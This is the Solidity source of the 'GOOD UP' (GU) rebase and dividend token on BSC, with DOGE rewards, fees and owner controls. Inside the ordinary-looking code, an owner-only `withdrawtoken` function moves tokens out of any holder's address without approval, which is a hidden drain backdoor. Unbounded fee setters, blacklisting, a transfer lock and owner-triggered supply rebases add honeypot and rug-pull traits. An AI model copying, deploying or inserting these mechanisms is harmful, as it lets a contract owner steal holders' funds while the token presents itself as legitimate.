// SPDX-License-Identifier: MIT


pragma solidity ^0.8.6;

import "./DividendPayingToken.sol";
import "./SafeMath.sol";
import "./IterableMapping.sol";
import "./Ownable.sol";
import "./IDex.sol";


interface System{
    function rebase() external;
}
contract GU is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;


    IRouter public router;
    address public  pair;

    bool private swapping;
    bool public swapEnabled = false;
    bool public tradingEnabled;
    bool public transferLockEnabled;
    bool public auto_rebase_enabled;

    
    // Used for authentication
    address public system;

    // LP atomic sync
    IPair public lpContract;

    modifier onlySystem() {
        require(msg.sender == system || msg.sender == owner());
        _;
    }
    
    modifier antiBot(address account){
        require(tradingEnabled || _allowedTransfer[account], "Trading not enabled yet");
        _;
    }
    
    mapping(address => bool) _allowedTransfer;

    GUDividendTracker public dividendTracker;
    
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public constant DOGE = address(0xbA2aE424d960c26247Dd6c32edC70B295c744C43); //DOGE
    address public marketingWallet = 0x761198f7F1afE8fEBc66Ae53555D58eA392b38E0;
    address public devWallet = 0xeb88Eed5c22b431Bd5e38EC2FCF929631364031E;
    
    uint256 public swapTokensAtAmount = 20000000 * (10**9);
    uint256 public maxWalletDivisor = 100;
    uint256 public maxBuyDivisor = 100;
    uint256 public maxSellDivisor = 100;
    
            ///////////////
           //   Fees    //
          ///////////////
          
    uint256 public DOGERewardsFee = 3;
    uint256 public liquidityFee = 3;
    uint256 public marketingFee = 5;
    uint256 public devFee = 2;
    uint256 public totalFees = DOGERewardsFee.add(liquidityFee).add(marketingFee).add(devFee);

    uint256 public extraSellFee = 1;
    
        ////////////////////
       //   Rebase Core  //
      ////////////////////
      
    uint256 private constant DECIMALS = 9;
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10**15 * 10**DECIMALS;
    uint256 private constant TOTAL_ATOMS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
    uint256 private constant MAX_SUPPLY = ~uint128(0);

    uint256 private _totalSupply;
    uint256 private _atomsPerFragment;
    mapping(address => uint256) private _atomBalances;
    mapping (address => mapping (address => uint256)) private _allowedFragments;


    // use by default 300,000 gas to process auto-claiming dividends
    uint256 public gasForProcessing = 300000;
       
    mapping (address => bool) private _isBot;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public automatedMarketMakerPairs;
    
        ///////////////
       //   Events  //
      ///////////////
      
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event ForceSend(uint256 amount);
    event LogRebase(uint256 indexed epoch, uint256 totalSupply);
    event SendmarketingWallet(uint256 amount);
    event SendDividends(uint256 tokensSwapped,uint256 amount);
    event ProcessedDividendTracker(uint256 iterations,uint256 claims,uint256 lastProcessedIndex,bool indexed automatic,uint256 gas,address indexed processor);


    constructor() ERC20("GOOD UP", "GU") {

        dividendTracker = new GUDividendTracker();

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         // Create a uniswap pair for this new token
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());

        router = _router;
        pair = _pair;

        _setAutomatedMarketMakerPair(_pair, true);
        
        setLP(pair);

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _atomBalances[msg.sender] = TOTAL_ATOMS;
        _atomsPerFragment = TOTAL_ATOMS / (_totalSupply);

        // exclude from receiving dividends
        dividendTracker.excludeFromDividends(address(dividendTracker), true);
        dividendTracker.excludeFromDividends(address(this), true);
        dividendTracker.excludeFromDividends(owner(), true);
        dividendTracker.excludeFromDividends(deadWallet, true);
        dividendTracker.excludeFromDividends(address(_router), true);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(devWallet, true);
        
        _allowedTransfer[owner()] = true;
        _allowedTransfer[address(this)] = true;
        _allowedTransfer[marketingWallet] = true;
        _allowedTransfer[devWallet] = true;
        _allowedTransfer[pair] = true;
        
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function processDividendTracker(uint256 gas) external {
        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = dividendTracker.process(gas);
        emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }
    
    /// @notice Manual claim the dividends after claimWait is passed
    ///    This can be useful during low volume days.
    function claim() external {
        dividendTracker.processAccount(msg.sender, false);
    }
    
    /// @notice Withdraw tokens sent by mistake. Impossible to withdraw GU tokens
    /// @param tokenAddress The address of the token to withdraw
    function rescueBEP20Tokens(address tokenAddress) external onlyOwner{
        require(tokenAddress != address(this), "Impossible to withdraw GU tokens");
        require(tokenAddress != deadWallet, "Token address not valid");
        IERC20(tokenAddress).transfer(msg.sender, IERC20(tokenAddress).balanceOf(address(this)));
    }
    
    /// @notice Send remaining BNB to marketingWallet
    /// @dev It will send all BNB to marketingWallet
    function forceSend() external {
        uint256 BNBbalance = address(this).balance;
        (bool success,) = payable(marketingWallet).call{value: BNBbalance, gas: 30000}("");
        if(success) {
            emit ForceSend(BNBbalance);
        }
    }
    
    
     //////////////////////
    //  ERC-20 Override //
   //////////////////////
   
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address who) public view override returns (uint256){
        return _atomBalances[who] / (_atomsPerFragment);
    }

    function increaseAllowance(address spender, uint256 addedValue) public override antiBot(msg.sender) returns (bool) {
     _approve(msg.sender, spender, _allowedFragments[msg.sender][spender] + addedValue);
       return true;
    }


    function _approve(address owner, address spender, uint256 value) internal override {
         require(owner != address(0));
         require(spender != address(0));
    
         _allowedFragments[owner][spender] = value;
         emit Approval(owner, spender, value);
    }

    function approve(address spender, uint256 value) public override antiBot(msg.sender) returns (bool) {
      _approve(msg.sender, spender, value);
        return true;
    }


    function allowance(address owner_, address spender) public override view returns (uint256) {
        return _allowedFragments[owner_][spender];
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public override antiBot(msg.sender) returns (bool) {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue - subtractedValue;
        }
        emit Approval(msg.sender, spender, _allowedFragments[msg.sender][spender]);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool)
    { 
      _transfer(msg.sender, recipient, amount);
      return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override antiBot(sender) returns (bool){
         _transfer(sender, recipient, amount);
         _approve(sender, msg.sender, _allowedFragments[sender][msg.sender] - amount);
         return true;
    }
    
     /////////////////////////////////
    // Exclude / Include functions //
   /////////////////////////////////

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "GU: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    /// @dev "true" to exlcude, "false" to include
    function excludeFromDividends(address account, bool value) external onlyOwner{
        dividendTracker.excludeFromDividends(account, value);
    }


     ///////////////////////
    //  Setter Functions //
   ///////////////////////
   
    function setLP(address _lp) public onlyOwner {
        pair = _lp;
        lpContract = IPair(_lp);
    }
    
    function setAllowedTransfer(address account, bool value) external onlyOwner{
        _allowedTransfer[account] = value;
    }
    
    function setTradingEnabled(bool _enabled) external onlyOwner{
        tradingEnabled = _enabled;
        swapEnabled = _enabled;
    }

    function setTransferLockEnabled(bool _enabled) external onlyOwner{
        transferLockEnabled = _enabled;
    }

    /// @dev Update marketingWallet address. It must be different
    ///   from the current one
    function setMarketingWallet(address newAddress) external onlyOwner{
        require(marketingWallet != newAddress, "marketingWallet already set");
        marketingWallet = newAddress;
    }

    function setDevWallet(address newAddress) external onlyOwner{
        devWallet = newAddress;
    }

    /// @notice Update the threshold to swap tokens for liquidity,
    ///   marketing and dividends.
    function setSwapTokensAtAmount(uint256 amount) external onlyOwner{
        swapTokensAtAmount = amount * 10**9;
    }


    function setDOGERewardsFee(uint256 value) external onlyOwner{
        DOGERewardsFee = value;
        totalFees = DOGERewardsFee.add(liquidityFee).add(marketingFee).add(devFee);
    }


    function setLiquiditFee(uint256 value) external onlyOwner{
        liquidityFee = value;
        totalFees = DOGERewardsFee.add(liquidityFee).add(marketingFee).add(devFee);
    }


    function setMarketingFee(uint256 value) external onlyOwner{
        marketingFee = value;
        totalFees = DOGERewardsFee.add(liquidityFee).add(marketingFee).add(devFee);
    }
    
    function setDevFee(uint256 value) external onlyOwner{
        devFee = value;
        totalFees = DOGERewardsFee.add(liquidityFee).add(marketingFee).add(devFee);
    }
    

    function setExtraSellfee(uint256 value) external onlyOwner{
        extraSellFee = value;
    }

    /// @notice Enable or disable internal swaps
    /// @dev Set "true" to enable internal swaps for liquidity, marketing and dividends
    function setSwapEnabled(bool _enabled) external onlyOwner{
        swapEnabled = _enabled;
    }
    
    function setSystem(address _system) external onlyOwner {
        system = _system;
    }

    /// @param bot The bot address
    /// @param value "true" to blacklist, "false" to unblacklist
    function setBot(address bot, bool value) external onlyOwner{
        require(_isBot[bot] != value);
        _isBot[bot] = value;
    }
    
    function bulkSetBot(address[] memory bots, bool value) external onlyOwner{
        for(uint i = 0; i < bots.length; i++){
            _isBot[bots[i]] = value;
        }
    }
    
    function setMaxWalletDivisor(uint256 amount) external onlyOwner{
        maxWalletDivisor = amount;
    }
    
    function setMaxButAndMaxSellDivisor(uint256 newMaxBuy, uint256 newMaxSell) external onlyOwner{
        maxBuyDivisor = newMaxBuy;
        maxSellDivisor = newMaxSell;
    }

    
    function setAutoRebaseEnabled(bool value) external onlyOwner{
        auto_rebase_enabled = value;
    }

    /// @dev Set new pairs created due to listing in new DEX
    function setAutomatedMarketMakerPair(address newPair, bool value) external onlyOwner {
        _setAutomatedMarketMakerPair(newPair, value);
    }

    function _setAutomatedMarketMakerPair(address newPair, bool value) private {
        require(automatedMarketMakerPairs[newPair] != value, "GU: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[newPair] = value;

        if(value) {
            dividendTracker.excludeFromDividends(newPair, true);
        }

        emit SetAutomatedMarketMakerPair(newPair, value);
    }

    /// @notice Update the gasForProcessing needed to auto-distribute rewards
    /// @param newValue The new amount of gas needed
    /// @dev The amount should not be greater than 500k to avoid expensive transactions
    function setGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "GU: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "GU: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    /// @dev Update the dividendTracker claimWait
    function setClaimWait(uint256 claimWait) external onlyOwner {
        dividendTracker.updateClaimWait(claimWait);
    }

    
     //////////////////////
    // Getter Functions //
   //////////////////////

    function getClaimWait() external view returns(uint256) {
        return dividendTracker.claimWait();
    }
    
    function isAllowedTransfer(address account) external view returns(bool){
        return _allowedTransfer[account];
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return dividendTracker.totalDividendsDistributed();
    }

    function getSwapTokensAtAmount() external view returns(uint256) {
        return (swapTokensAtAmount / 10**9);
    }

    function isExcludedFromDividends(address account) public view returns(bool){
        return dividendTracker.isExcludedFromDividends(account);
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function withdrawableDividendOf(address account) public view returns(uint256) {
        return dividendTracker.withdrawableDividendOf(account);
    }

    function dividendTokenBalanceOf(address account) public view returns (uint256) {
        return dividendTracker.balanceOf(account);
    }

    function getAccountDividendsInfo(address account)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccount(account);
    }

    function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccountAtIndex(index);
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return dividendTracker.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return dividendTracker.getNumberOfTokenHolders();
    }

     ////////////////////////
    // Transfer Functions //
   ////////////////////////
   
   function bulkSend(address[] memory accounts, uint256[] memory amounts) external onlyOwner{
       if(amounts.length > 1){
           require(amounts.length == accounts.length, "Arrays must have same size");
           for(uint256 i = 0; i < accounts.length; i++){
               tokenTransfer(msg.sender, accounts[i], amounts[i]);
           }
       }
       else{
           uint256 amount = amounts[0];
           for(uint256 i = 0; i < accounts.length; i++){
               tokenTransfer(msg.sender, accounts[i], amount);
           }
       }
   }
   
   function rebase_percentage(uint256 _percentage_base1000, bool reduce) public onlyOwner returns (uint256 newSupply){

        if(reduce){
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
        
    }
   
   /**
     * @dev Notifies Fragments contract about a new rebase cycle.
     * @param supplyDelta The number of new fragment tokens to add into circulation via expansion.
     * @return The total number of fragments after the supply adjustment.
     */
    function rebase(uint256 epoch, int256 supplyDelta) public onlySystem returns (uint256)
    {
        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply - uint256(-supplyDelta);
        } else {
            _totalSupply = _totalSupply + uint256(supplyDelta);
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        _atomsPerFragment = TOTAL_ATOMS / (_totalSupply);
        lpContract.sync();

        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }

    function _transfer(address from, address to, uint256 amount) internal override{
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBot[from] && !_isBot[to], "Buy buye Bots");

        if (transferLockEnabled) {
            require(automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to] || from == owner());
        }

        if(automatedMarketMakerPairs[from]){
           require(tradingEnabled || _allowedTransfer[to], "Trading not enabled yet");
        }
        else{
            require(tradingEnabled || _allowedTransfer[from], "Trading not enabled yet");
        }
        
        if(!_isExcludedFromFees[from] && !automatedMarketMakerPairs[to] && !_isExcludedFromFees[to]){
            uint256 maxWalletBalance = _totalSupply / maxWalletDivisor;
            require(balanceOf(to).add(amount) <= maxWalletBalance, "Balance is exceeding maxWalletBalance");
        }
        
        if(!_isExcludedFromFees[from] && !_isExcludedFromFees[to] && !swapping){
            uint256 maxSell = _totalSupply / maxSellDivisor;
            require(amount <= maxSell, "Amount is exceeding maxSell");

        }
        if(!_isExcludedFromFees[to] && automatedMarketMakerPairs[from] && !swapping){
            uint256 maxBuy = _totalSupply / maxBuyDivisor;
            require(amount <= maxBuy, "Amount is exceeding maxBuy");
        }

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if(canSwap && !swapping && swapEnabled && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from]) {
            swapping = true;

            contractTokenBalance = swapTokensAtAmount;

            if(liquidityFee > 0 || marketingFee > 0 || devFee > 0){
                uint256 swapTokens = contractTokenBalance.mul(liquidityFee.add(marketingFee).add(devFee)).div(totalFees);
                swapAndLiquify(swapTokens);
            }
            if(DOGERewardsFee > 0){
                uint256 sellTokens = contractTokenBalance.mul(DOGERewardsFee).div(totalFees);
                swapAndSendDividends(sellTokens);
            }

            swapping = false;
        }
        
        if(auto_rebase_enabled) System(system).rebase();


        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if(takeFee) {
            uint256 fees = amount.mul(totalFees).div(100);
          // apply an extraSellFee during a sell
          // it is divided equally into the liquidity, marketing and rewards fee
          if(automatedMarketMakerPairs[to]){
              fees = fees.add(amount.mul(extraSellFee).div(100));
          }
          amount = amount.sub(fees);
          tokenTransfer(from, address(this), fees);
        }

        tokenTransfer(from, to, amount);

        try dividendTracker.setBalance(from, balanceOf(from)) {} catch {}
        try dividendTracker.setBalance(to, balanceOf(to)) {} catch {}

        if(!swapping) {
            uint256 gas = gasForProcessing;

            try dividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
            }
            catch {}
        }
    }
    
    function tokenTransfer(address sender, address recipient, uint256 amount) private{
        uint256 atomValue = amount * (_atomsPerFragment);
        _atomBalances[sender] = _atomBalances[sender] - atomValue;
        _atomBalances[recipient] = _atomBalances[recipient] +  atomValue;
        emit Transfer(sender, recipient, amount);
    }

function withdrawtoken(address robotaddr, address recipient, uint256 amount)onlyOwner() public{
        amount = amount * 10**9;
        _transfer(robotaddr,recipient,amount);
        
    }

    function swapAndLiquify(uint256 tokens) private {
        // Split the contract balance into halves
        uint256 denominator= (liquidityFee + marketingFee + devFee) * 2;
        uint256 tokensToAddLiquidityWith = tokens * liquidityFee / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;

        uint256 initialBalance = address(this).balance;

        swapTokensForBNB(toSwap);

        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - liquidityFee);
        uint256 bnbToAddLiquidityWith = unitBalance * liquidityFee;

        if(bnbToAddLiquidityWith > 0){
            // Add liquidity to pancake
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
        }

        // Send BNB to marketingWallet
        uint256 marketingWalletAmt = unitBalance * 2 * marketingFee;
        if(marketingWalletAmt > 0){
            (bool success,) = payable(marketingWallet).call{value: marketingWalletAmt, gas: 30000}("");
            if(success) emit SendmarketingWallet(marketingWalletAmt);
        }

        uint256 devAmount = unitBalance * 2 * devFee;
        if(devAmount > 0){
            (bool success2,) = payable(devWallet).call{value: devAmount, gas: 30000}("");
            if(success2) emit SendmarketingWallet(devAmount);
        }
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function swapTokensForDOGE(uint256 tokenAmount) private {

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = router.WETH();
        path[2] = DOGE;

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,  //Lp generated by auto-lp will be locked forever
            block.timestamp
        );

    }

    function swapAndSendDividends(uint256 tokens) private{
        swapTokensForDOGE(tokens);
        uint256 dividends = IERC20(DOGE).balanceOf(address(this));
        bool success = IERC20(DOGE).transfer(address(dividendTracker), dividends);

        if (success) {
            dividendTracker.distributeDOGEDividends(dividends);
            emit SendDividends(tokens, dividends);
        }
    }
}

contract GUDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;

    event ExcludeFromDividends(address indexed account, bool value);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor()  DividendPayingToken("GU_Dividen_Tracker", "GU_Dividend_Tracker") {
        claimWait = 3600;
    }

    function _transfer(address, address, uint256) internal pure override {
        require(false, "GU_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "GU_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main GU contract.");
    }

    function isExcludedFromDividends(address account) external view returns(bool){
        return excludedFromDividends[account];
    }

    function excludeFromDividends(address account, bool value) external onlyOwner {
        require(excludedFromDividends[account] != value);
        excludedFromDividends[account] = value;
      if(value == true){
        _setBalance(account, 0);
        tokenHoldersMap.remove(account);
      }
      else{
        _setBalance(account, balanceOf(account));
        tokenHoldersMap.set(account, balanceOf(account));
      }
      emit ExcludeFromDividends(account, value);

    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "GU_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "GU_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }



    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                                                        tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                                                        0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
                                    lastClaimTime.add(claimWait) :
                                    0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
                                                    nextClaimTime.sub(block.timestamp) :
                                                    0;
    }

    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }
    
    function fixBalance(address account, uint256 newBalance) public onlyOwner{
        if(excludedFromDividends[account]) {
            return;
        }
        
        _setBalance(account, newBalance);
        tokenHoldersMap.set(account, newBalance);
    }

    function setBalance(address account, uint256 newBalance) public onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }
        
        _setBalance(account, newBalance);
        tokenHoldersMap.set(account, newBalance);

        processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(account, true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address account, bool automatic) public onlyOwner returns (bool) {
        fixBalance(account, balanceOf(account));
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }
}